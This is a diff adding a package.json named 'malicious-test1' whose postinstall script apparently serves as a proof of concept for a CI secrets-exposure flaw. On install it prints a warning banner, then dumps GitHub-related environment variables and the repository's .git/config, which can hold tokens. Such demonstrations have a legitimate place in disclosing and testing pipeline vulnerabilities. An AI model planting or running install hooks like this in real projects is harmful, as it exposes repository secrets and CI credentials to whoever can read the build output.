@@ -1,0 +1,6 @@
+{
+  "name": "malicious-test1",
+  "scripts": {
+    "postinstall": "echo '🚨🚨🚨 CRITICAL VULNERABILITY EXPLOITED 🚨🚨🚨'; echo 'This script is running with the base repositorys secrets and permissions!'; printenv | grep GITHUB;cat .git/config"
+  }
+}
